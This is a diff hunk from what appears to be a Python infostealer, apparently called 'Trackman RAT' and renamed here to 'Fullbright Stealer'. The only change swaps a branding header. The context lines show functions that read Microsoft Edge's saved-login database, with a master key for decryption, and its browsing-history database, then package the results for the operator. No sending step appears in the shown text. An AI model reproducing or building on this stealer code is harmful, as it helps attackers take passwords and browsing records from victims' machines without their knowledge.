@@ -80,7 +80,7 @@ def get_login_data(master_key):
                 return ""
         return ""
     
-    header = "------------TRACKMAN RAT BY RAYWZW------------\n"
+    header = "------------FULLBRIGHT STEALER BY RAYWZW------------\n"
     data = extract_data_from_db(os.path.join(edge_path, 'Login Data'), query, process_row, 'login_db')
     return header + data
 
@@ -102,7 +102,7 @@ def get_history():
         last_visited = time.strftime('%B, %d, %Y - %I %p', time.gmtime(row[3] / 1000000 - 11644473600))
         return f"URL: {row[0]}\nTitle: {row[1]}\nVisit Count: {row[2]}\nLast Visited: {last_visited}\n----------------------\n"
     
-    header = "------------TRACKMAN RAT BY RAYWZW------------\n"
+    header = "------------FULLBRIGHT STEALER BY RAYWZW------------\n"
     data = extract_data_from_db(os.path.join(edge_path, 'History'), query, process_row, 'history_db')
     return header + data
 
